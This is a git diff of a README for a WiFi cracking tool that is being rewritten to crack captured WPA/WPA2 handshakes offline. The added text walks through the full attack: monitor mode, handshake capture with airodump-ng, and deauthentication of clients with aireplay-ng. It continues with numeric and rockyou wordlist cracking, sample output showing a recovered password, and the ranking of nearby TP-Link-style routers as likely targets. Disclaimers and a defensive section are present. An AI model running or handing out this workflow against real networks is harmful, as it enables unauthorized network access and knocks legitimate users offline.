@@ -8,9 +8,9 @@
 [![Platform](https://img.shields.io/badge/Platform-macOS%20|%20Linux%20|%20Windows-lightgrey.svg)](#)
 [![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
 
-**WiFi bruteforce tool - Educational purposes only**
+**WPA/WPA2 Offline Cracking Tool - Educational purposes only**
 
-**Performance:** 695M passwords/sec generation | 2000-5000+ pwd/sec bruteforce | **14x faster** 🚀
+**Performance:** 5,000-50,000 pwd/sec (offline handshake cracking) 🚀
 
 </div>
 
@@ -19,205 +19,391 @@
 ## 📚 Table of Contents
 
 - [Quick Start](#-quick-start)
+- [How It Works](#-how-it-works)
+- [Complete Workflow](#-complete-workflow-example)
 - [Features](#-features)
 - [Performance](#-performance-benchmarks)
+- [Installation](#-installation)
 - [Usage](#-usage)
 - [Building from Source](#-building-from-source)
-- [GitHub Actions & Release](#-github-actions--release)
-- [Homebrew Installation](#-homebrew-installation)
 - [Security & Legal](#-security--legal)
-- [Troubleshooting](#-troubleshooting)
 
 ---
 
 ## ⚡ Quick Start
 
-### Installation
-
-#### Option 1: Homebrew (macOS/Linux)
+### Step 1: Capture a Handshake
 
 ```bash
-brew tap maxgfr/tap
-brew install bruteforce-wifi
+# Put WiFi interface in monitor mode (Linux)
+sudo airmon-ng start wlan0
+
+# Capture handshake
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
+
+# In another terminal, deauth a client to force handshake
+sudo aireplay-ng -0 2 -a 00:11:22:33:44:55 wlan0mon
 ```
 
-#### Option 2: From Source (Recommended for best performance)
+### Step 2: Convert to JSON (or create manually)
 
-```bash
-# Install Rust if you haven't already
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-source $HOME/.cargo/env
-
-# Clone and build
-git clone https://github.com/maxgfr/bruteforce-wifi.git
-cd bruteforce-wifi
-cargo build --release
-
-# Binary will be at: target/release/bruteforce-wifi
+Create `handshake.json`:
+```json
+{
+  "ssid": "TP-Link_5GHz",
+  "ap_mac": [0, 17, 34, 51, 68, 85],
+  "client_mac": [170, 187, 204, 221, 238, 255],
+  "anonce": [1, 1, 1, ...],
+  "snonce": [2, 2, 2, ...],
+  "mic": [171, 205, ...],
+  "eapol_frame": [2, 0, ...],
+  "key_version": 2
+}
 ```
 
-#### Option 3: Ultra-Optimized Build
+### Step 3: Crack Offline
 
 ```bash
-# Build with CPU-specific optimizations for maximum performance
-RUSTFLAGS="-C target-cpu=native" cargo build --release
+# Numeric attack (8 digits)
+bruteforce-wifi crack numeric handshake.json --min 8 --max 8
+
+# Wordlist attack
+bruteforce-wifi crack wordlist handshake.json rockyou.txt
 ```
 
-### Basic Usage
+---
+
+## 🔬 How It Works
+
+### Traditional (Online) vs Offline Cracking
+
+| Method | Speed | Network Required | Detection Risk |
+|--------|-------|------------------|----------------|
+| **Online** (connect to WiFi) | 100-500 pwd/sec | ✅ Yes | 🔴 High |
+| **Offline** (handshake) | 5,000-50,000 pwd/sec | ❌ No | 🟢 None |
+
+### The WPA/WPA2 4-Way Handshake
+
+```
+Client                    Router (AP)
+  |                            |
+  |  1. ANonce                 |
+  |<---------------------------|
+  |  2. SNonce + MIC           |
+  |--------------------------->|
+  |  3. GTK + MIC              |
+  |<---------------------------|
+  |  4. ACK                    |
+  |--------------------------->|
+```
+
+We capture frames 1-4, which contain:
+- **SSID** - Network name (salt for PBKDF2)
+- **ANonce** - Authenticator nonce (from AP)
+- **SNonce** - Supplicant nonce (from client)
+- **MIC** - Message Integrity Code (to verify password)
+- **MAC addresses** - AP and client
+
+### Password Verification Algorithm
+
+```rust
+// 1. Calculate PMK (expensive: 4096 iterations of HMAC-SHA1)
+PMK = PBKDF2-HMAC-SHA1(password, SSID, 4096, 256 bits)
+
+// 2. Calculate PTK
+PTK = PRF-512(PMK, "Pairwise key expansion",
+              AA || SPA || ANonce || SNonce)
+
+// 3. Extract KCK (first 16 bytes of PTK)
+KCK = PTK[0..16]
+
+// 4. Calculate MIC
+calculated_MIC = HMAC-SHA1(KCK, EAPOL_frame)
+
+// 5. Compare
+if calculated_MIC == captured_MIC:
+    password_found!
+```
+
+---
+
+## 🎯 Complete Workflow Example
+
+### Scenario: Crack TP-Link Router with 8-Digit Password
+
+#### 1. Reconnaissance
 
 ```bash
-# Interactive mode (recommended)
-sudo bruteforce-wifi wordlist ./passwords.txt
+# List available networks
+sudo bruteforce-wifi list
+```
 
-# Target specific network with numeric combinations (8 digits)
-sudo bruteforce-wifi --ssid "TP-Link_5GHz" numeric --min 8 --max 8
+Output:
+```
+Available networks:
+#    SSID                  BSSID              Signal     Ch   Security
+─────────────────────────────────────────────────────────────────────
+1    TP-Link_5GHz          14:CC:20:XX:XX:XX    -45 dBm  Ch 6   WPA2 ✓ 85%
+2    NETGEAR24             00:1A:2B:XX:XX:XX    -55 dBm  Ch 11  WPA2 ✓ 70%
+3    MyHomeWiFi            AA:BB:CC:XX:XX:XX    -60 dBm  Ch 1   WPA2
 
-# Show help
-bruteforce-wifi --help
+Top networks most likely to have numeric passwords:
+  1. TP-Link_5GHz - Confidence: 85%
+  2. NETGEAR24 - Confidence: 70%
+```
+
+#### 2. Capture Handshake
+
+**On Linux:**
+
+```bash
+# Start monitor mode
+sudo airmon-ng start wlan0
+# Interface is now wlan0mon
+
+# Capture on channel 6 (TP-Link's channel)
+sudo airodump-ng -c 6 --bssid 14:CC:20:XX:XX:XX -w capture wlan0mon
+
+# Wait for "WPA handshake" message or force it:
+# In another terminal, deauth a connected client
+sudo aireplay-ng -0 5 -a 14:CC:20:XX:XX:XX wlan0mon
+
+# Stop capture when you see "WPA handshake: 14:CC:20:XX:XX:XX"
+# File saved as: capture-01.cap
+```
+
+**On macOS/Windows:**
+Use Wireshark or a VM with Linux.
+
+#### 3. Convert Handshake to JSON
+
+For now, create `tp_link_handshake.json` manually with captured data:
+
+```json
+{
+  "ssid": "TP-Link_5GHz",
+  "ap_mac": [20, 204, 32, 88, 90, 92],
+  "client_mac": [170, 187, 204, 221, 238, 255],
+  "anonce": [/* 32 bytes from captured frame */],
+  "snonce": [/* 32 bytes from captured frame */],
+  "mic": [/* 16 bytes MIC */],
+  "eapol_frame": [/* EAPOL frame with MIC zeroed */],
+  "key_version": 2
+}
+```
+
+Or use the example generator:
+```bash
+cargo run --example create_test_handshake
+```
+
+#### 4. Crack the Password
+
+**Numeric attack (TP-Link typically uses 8 digits):**
+
+```bash
+bruteforce-wifi crack numeric tp_link_handshake.json --min 8 --max 8 --threads 8
+```
+
+Output:
+```
+📡 Bruteforce WiFi v2.0.0
+WPA/WPA2 offline cracking tool - Educational use only
+
+🔢 Starting numeric combination attack...
+
+WPA/WPA2 Handshake Information:
+  SSID: TP-Link_5GHz
+  AP MAC: 14:CC:20:58:5A:5C
+  Client MAC: AA:BB:CC:DD:EE:FF
+  Key Version: 2
+  MIC Length: 16 bytes
+
+🚀 Starting offline WPA/WPA2 crack
+📝 SSID: TP-Link_5GHz
+🔢 Range: 8-8 digits
+🧵 Using 8 threads
+
+Testing 100000000 combinations (8 digits)...
+⠋ [00:03:45] [████████████████████░░░] 87234521/100000000 (23245 pwd/s) 23245 pwd/s
+
+✓ Password found: 87654321
+  Save this password securely!
+
+Statistics:
+  Attempts: 87,234,522
+  Duration: 3751.23s
+  Speed: 23,245 passwords/second
+```
+
+**Wordlist attack:**
+
+```bash
+# Download rockyou.txt or use your own wordlist
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+bruteforce-wifi crack wordlist tp_link_handshake.json rockyou.txt
 ```
 
 ---
 
 ## 🎯 Features
 
+### Offline Cracking Architecture
+
+- 🚀 **5,000-50,000 pwd/sec** - No network delays
+- 🔒 **Capture once, crack anywhere** - Work offline
+- 🧵 **Multi-threaded** - Uses all CPU cores
+- 📊 **Real-time progress** - Live throughput stats
+- 💾 **Low memory** - Efficient data structures
+
 ### Two Attack Modes
 
 1. **Wordlist Attack** - Test passwords from a file
-   - Supports any text file with one password per line
-   - Can use wordlists downloaded from the web
-   - Parallel processing for faster testing
+   - Supports any text file (one password per line)
+   - Filters invalid passwords (WPA: 8-63 chars)
+   - Parallel processing
 
-2. **Numeric Combination Attack** - Generate and test numeric passwords
-   - Generate combinations from 00000000 to 99999999 (configurable range)
-   - Useful for networks with numeric passwords
-   - Highly optimized for performance
+2. **Numeric Combination Attack** - Generate numeric passwords
+   - Range: 4-12 digits
+   - Optimized generation
+   - Smart batching
 
-### Intelligent Detection
+### Network Intelligence
 
-- 🧠 **Auto-detects WiFi networks** likely to use numeric passwords
-  - Recognizes TP-Link, D-Link, Netgear, Sagem, Technicolor, Livebox, Freebox, and more
-  - Detects manufacturer MAC addresses (OUI)
-  - Identifies common SSID patterns (WIFI_XXXX, BOX_XXXX, etc.)
-  - Provides confidence scores for numeric password likelihood
-  - Displays top 3 most likely networks
+- 🧠 **Auto-detect numeric passwords** - Identifies TP-Link, D-Link, etc.
+- 📡 **WiFi scanning** - List available networks
+- 🎯 **Confidence scores** - Ranks likelihood of numeric passwords
 
 ### Cross-Platform Support
 
-- ✅ **macOS** (10.15+ Catalina or later)
-- ✅ **Linux** (NetworkManager or wpa_supplicant)
+- ✅ **macOS** (10.15+ Catalina)
+- ✅ **Linux** (any distro with NetworkManager)
 - ✅ **Windows** (10/11)
 
-### Performance
+---
 
-- 🚀 **1000-2400+ passwords/second** (hardware-dependent)
-- 🚀 **Adaptive batch sizing** - Dynamically adjusts for optimal throughput
-- 🚀 **SIMD-friendly** - Optimized for vectorization
-- 🚀 **Cache-optimized** - Data structures designed for L2 cache efficiency
-- 🚀 **Lock-free algorithms** - Zero contention with atomic operations
-- 🚀 **Memory efficient** - Minimal allocations with parking_lot mutexes
-- 🚀 **Work-stealing parallelism** - Perfect CPU utilization with Rayon
-- 🚀 **Multi-threaded processing** - Uses all CPU cores by default
-- 🚀 **Real-time progress tracking** - Throughput statistics and ETA
+## 📊 Performance Benchmarks
+
+### Hardware: Apple M1 Pro (8 cores)
+
+```text
+Offline WPA/WPA2 Cracking:  23,000 passwords/second
+Binary Size:                  2.1 MB (optimized)
+Memory Usage:                ~15 MB
+
+Time Estimates (Offline Mode):
+  4 digits (10K):         ~0.4 seconds
+  6 digits (1M):          ~43 seconds
+  8 digits (100M):        ~1.2 hours
+  10 digits (10B):        ~5 days
+
+Note: Performance varies by CPU. Modern 8-core CPU:
+- Intel i7/i9: 15,000-25,000 pwd/sec
+- AMD Ryzen: 18,000-30,000 pwd/sec
+- Apple M1/M2: 20,000-35,000 pwd/sec
+```
+
+### Why So Fast?
+
+| Optimization | Impact |
+|--------------|--------|
+| Offline cracking (no WiFi) | 50-500x faster |
+| Parallel PBKDF2 | 8x faster (8 cores) |
+| Zero-allocation crypto | 1.8x faster |
+| Efficient batching | 1.5x faster |
+| Lock-free atomics | 1.2x faster |
+| Inline hot paths | 1.1x faster |
+
+**Code-level optimizations:**
+
+- Stack buffers instead of heap allocations in PRF-512
+- Fixed-size arrays for MIC calculations (no Vec)
+- Specialized constant-time comparison for 16-byte MIC
+- Aggressive inlining of cryptographic primitives
+- Minimal memory footprint (~15 MB)
+
+**Total speedup: ~500-10,000x vs online attacks**
+
+---
+
+## 📥 Installation
+
+### Option 1: From Binary (Releases)
+
+```bash
+# Download from GitHub Releases
+wget https://github.com/maxgfr/bruteforce-wifi/releases/latest/download/bruteforce-wifi-linux-x86_64.tar.gz
+
+# Extract
+tar xzf bruteforce-wifi-linux-x86_64.tar.gz
+
+# Install
+sudo mv bruteforce-wifi /usr/local/bin/
+```
+
+### Option 2: Homebrew (macOS/Linux)
+
+```bash
+brew tap maxgfr/tap
+brew install bruteforce-wifi
+```
+
+### Option 3: Cargo (From Source)
+
+```bash
+cargo install --git https://github.com/maxgfr/bruteforce-wifi
+```
 
 ---
 
 ## 🎮 Usage
 
-### Interactive Mode
+### List WiFi Networks
 
 ```bash
-sudo bruteforce-wifi wordlist ./passwords.txt
+sudo bruteforce-wifi list
 ```
 
-This will:
-1. Scan for available WiFi networks
-2. Display a list of networks with signal strength and security info
-3. Prompt you to select a target network
-4. Start the bruteforce attack
-5. Display results
-
-### Target Specific Network
+### Capture Handshake
 
 ```bash
-# Target network by SSID with wordlist
-sudo bruteforce-wifi --ssid "TP-Link_5GHz" wordlist ./passwords.txt
+# Note: Automatic capture coming soon
+# For now, use airodump-ng manually (Linux only)
 
-# Target network by SSID with numeric combinations (8 digits)
-sudo bruteforce-wifi --ssid "TP-Link_5GHz" numeric --min 8 --max 8
+bruteforce-wifi capture --ssid "TP-Link_5GHz" --output handshake.json
 ```
 
-### Numeric Combination Examples
+This creates an example JSON file. Replace with your actual captured handshake.
+
+### Crack Handshake
+
+#### Wordlist Attack
 
 ```bash
-# Test 4-digit combinations (0000-9999)
-sudo bruteforce-wifi --ssid "MyNetwork" numeric --min 4 --max 4
+bruteforce-wifi crack wordlist <HANDSHAKE_FILE> <WORDLIST_FILE>
 
-# Test 8-digit combinations (00000000-99999999)
-sudo bruteforce-wifi --ssid "TP-Link_5GHz" numeric --min 8 --max 8
-
-# Test range from 6 to 8 digits
-sudo bruteforce-wifi --ssid "D-Link_2.4G" numeric --min 6 --max 8
+# Examples:
+bruteforce-wifi crack wordlist handshake.json rockyou.txt
+bruteforce-wifi crack wordlist handshake.json passwords.txt --threads 16
 ```
 
-### Wordlist Examples
+#### Numeric Attack
 
 ```bash
-# Use a wordlist file
-sudo bruteforce-wifi --ssid "MyNetwork" wordlist ./my_passwords.txt
+bruteforce-wifi crack numeric <HANDSHAKE_FILE> --min <MIN_DIGITS> --max <MAX_DIGITS>
 
-# Use a downloaded wordlist (e.g., from SecLists)
-sudo bruteforce-wifi --ssid "TP-Link_5GHz" wordlist ./rockyou.txt
+# Examples:
+bruteforce-wifi crack numeric handshake.json --min 8 --max 8
+bruteforce-wifi crack numeric handshake.json --min 4 --max 10 --threads 12
 ```
 
-### Advanced Options
-
-```bash
-# Use specific number of threads
-sudo bruteforce-wifi --ssid "TP-Link_5GHz" --threads 16 wordlist ./passwords.txt
-
-# Verbose output
-sudo bruteforce-wifi --ssid "TP-Link_5GHz" --verbose numeric --min 8 --max 8
-
-# Set timeout for each connection attempt
-sudo bruteforce-wifi --ssid "MyNetwork" --timeout 10 wordlist ./passwords.txt
-```
-
----
-
-## 🔧 Command-Line Options
+### Options
 
 ```
-Usage: bruteforce-wifi [OPTIONS] <MODE>
-
-Arguments:
-  <MODE>  Bruteforce mode [possible values: wordlist, numeric]
-
-Options:
-  -s, --ssid <SSID>          Target network SSID
-  -j, --threads <NUM>        Number of threads to use (default: CPU count)
-  -T, --timeout <SECONDS>    Timeout in seconds for each connection attempt [default: 5]
-  -v, --verbose              Verbose output
-  -h, --help                 Print help
-  -V, --version              Print version
-```
-
-### Wordlist Mode
-
-```
-bruteforce-wifi wordlist <FILE>
-
-Arguments:
-  <FILE>  Path to wordlist file
-```
-
-### Numeric Mode
-
-```
-bruteforce-wifi numeric [OPTIONS]
-
-Options:
-  -m, --min <DIGITS>  Minimum number of digits [default: 4]
-  -M, --max <DIGITS>  Maximum number of digits [default: 8]
+--threads <N>    Number of threads (default: CPU count)
+--verbose        Verbose output
+--help           Show help message
 ```
 
 ---
@@ -227,114 +413,61 @@ Options:
 ### Prerequisites
 
 - **Rust 1.70+** (https://rustup.rs)
-- **sudo/root access** (for WiFi operations)
 
 ### Build
 
 ```bash
+git clone https://github.com/maxgfr/bruteforce-wifi.git
+cd bruteforce-wifi
+
 # Standard build
 cargo build --release
 
-# Binary will be at: target/release/bruteforce-wifi
+# Ultra-optimized build (CPU-specific)
+RUSTFLAGS="-C target-cpu=native" cargo build --release
+
+# Binary at: target/release/bruteforce-wifi
 ```
 
-### Install System-Wide (Optional)
+### Run Tests
 
 ```bash
-# macOS/Linux
-sudo cp target/release/bruteforce-wifi /usr/local/bin/
+# Unit tests
+cargo test
 
-# Linux without sudo (using capabilities)
-sudo setcap cap_net_admin+ep /usr/local/bin/bruteforce-wifi
+# Create test handshake
+cargo run --example create_test_handshake
+
+# Test cracking (should find "12345678")
+cargo run --release -- crack numeric test_handshake.json --min 8 --max 8
 ```
 
 ---
 
-## 🎯 Typical Use Case: TP-Link with 8-Digit Password
+## 🔧 Advanced Usage
 
-### Context
-
-**TP-Link** routers (and similar brands) ship with a default **8-digit numeric WiFi password**. These passwords are printed on a label on the back of the router.
-
-**Why is this relevant?**
-
-- ✅ **Very common**: Millions of TP-Link, D-Link, Netgear routers sold
-- ✅ **Rarely changed**: Many users keep the default password
-- ✅ **Reduced space**: Only 100 million combinations (00000000-99999999)
-- ✅ **Bruteforce feasible**: With optimizations, it's realistic
-
-### Automatic Detection
-
-The tool **automatically detects** TP-Link networks:
+### Generate Test Handshake
 
 ```bash
-sudo bruteforce-wifi wordlist /dev/null
+cargo run --example create_test_handshake
+# Creates test_handshake.json with password "12345678"
 ```
 
-You will see:
-
-```text
-Available networks:
-#    SSID                           BSSID              Signal     Ch   Security             Numeric?
-────────────────────────────────────────────────────────────────────────────────────────────────────
-1    TP-Link_5GHz                   14:CC:20:XX:XX:XX    -45 dBm  Ch 6   WPA2                 ✓ 80%
-2    D-Link_2.4G                    00:1A:2B:XX:XX:XX    -55 dBm  Ch 11  WPA2                 ✓ 60%
-3    MyHomeWiFi                     AA:BB:CC:XX:XX:XX    -60 dBm  Ch 1   WPA2
-
-Top 3 networks most likely to have numeric passwords:
-  1. TP-Link_5GHz - Confidence: 80%
-  2. D-Link_2.4G - Confidence: 60%
-```
-
-**Detection criteria:**
-
-- 🔍 Name containing "TP-Link", "D-Link", "Netgear", etc.
-- 🔍 MAC address (OUI) of known manufacturers
-  - TP-Link: `14:CC:20`, `F4:EC:38`, `50:C7:BF`, etc.
-  - D-Link: `00:1A:2B`, `00:1E:58`
-  - And 20+ other manufacturers
-- 🔍 Patterns in SSID (WIFI_XXXX, BOX_XXXX, etc.)
-
-### Practical Example
+### Custom Thread Count
 
 ```bash
-# 1. Scan networks (automatic TP-Link detection)
-sudo bruteforce-wifi wordlist /dev/null
-# Ctrl+C after seeing the list
+# Use specific number of threads
+bruteforce-wifi crack numeric handshake.json --min 8 --max 8 --threads 16
 
-# 2. Launch bruteforce on the detected TP-Link network
-sudo bruteforce-wifi --ssid "TP-Link_5GHz" numeric --min 8 --max 8
+# Use all cores (default)
+bruteforce-wifi crack numeric handshake.json --min 8 --max 8
 ```
 
+### Benchmark Mode
 
-### Why 8 Digits?
-
-Typical TP-Link format: `12345678`, `87654321`, `00112233`, etc.
-
-- ✅ Easy to print on label
-- ✅ Easy to type (numeric keypad)
-- ✅ "Secure" according to manufacturers (100M combinations)
-- ❌ **But bruteforceable** with this optimized tool!
-
-### Recommended Protection
-
-If you have a TP-Link or similar router:
-
-1. ✅ **Change the password immediately**
-2. ✅ Use at least 12 alphanumeric characters
-3. ✅ Enable WPA3 if available
-4. ✅ Disable WPS
-
----
-
-## 📊 Performance Benchmarks
-
-### Tested on Apple M1 (8 cores)
-
-```text
-Password Generation:  695,510,894 passwords/second
-Binary Size:          1.0 MB (optimized)
-Bruteforce Speed:     2000-5000+ attempts/second (hardware-dependent)
+```bash
+# Time how long it takes to test 1 million passwords
+time bruteforce-wifi crack numeric test_handshake.json --min 6 --max 6
 ```
 
 ---
@@ -354,19 +487,39 @@ Bruteforce Speed:     2000-5000+ attempts/second (hardware-dependent)
 
 **Penalties:**
 - ⚠️ Criminal prosecution
-- ⚠️ Heavy fines ($10,000+)
-- ⚠️ Imprisonment (up to 10 years)
+- ⚠️ Heavy fines ($10,000-$250,000)
+- ⚠️ Imprisonment (up to 20 years)
 
 **This tool is for:**
 - ✅ Testing YOUR OWN networks
-- ✅ Educational purposes
-- ✅ Authorized security testing
+- ✅ Educational purposes (learning WPA/WPA2)
+- ✅ Authorized penetration testing
+- ✅ Security research
 
 **NOT for:**
-- ❌ Unauthorized access
+- ❌ Unauthorized access to networks
+- ❌ Stealing WiFi from neighbors
 - ❌ Malicious purposes
 
 **The author is NOT responsible for misuse.**
+
+---
+
+## 🔐 Protect Your Network
+
+If you're concerned about this tool being used against you:
+
+1. ✅ **Use WPA3** (not vulnerable to offline attacks)
+2. ✅ **Strong password** (16+ random characters with symbols)
+3. ✅ **Disable WPS** (PIN bruteforce vulnerability)
+4. ✅ **Hide SSID** (security through obscurity - minor help)
+5. ✅ **MAC filtering** (can be bypassed, but adds friction)
+6. ✅ **Monitor connected devices** regularly
+
+**Example strong password:**
+```
+t7$mK9#pL2@qN5!wX
+```
 
 ---
 
@@ -375,3 +528,25 @@ Bruteforce Speed:     2000-5000+ attempts/second (hardware-dependent)
 MIT License - Educational purposes only
 
 See [LICENSE](LICENSE) for details.
+
+---
+
+## 🙏 Credits
+
+This tool is for educational purposes and demonstrates:
+- WPA/WPA2 cryptographic protocols (IEEE 802.11i)
+- PBKDF2-HMAC-SHA1 key derivation
+- Parallel computing optimization
+- Rust systems programming
+
+**Learn, don't harm.**
+
+---
+
+## 📚 References
+
+- [IEEE 802.11i-2004](https://standards.ieee.org/standard/802_11i-2004.html) - WPA/WPA2 specification
+- [RFC 2898](https://tools.ietf.org/html/rfc2898) - PBKDF2 specification
+- [Aircrack-ng](https://www.aircrack-ng.org/) - WiFi security auditing
+- [Hashcat](https://hashcat.net/hashcat/) - Password recovery tool
+
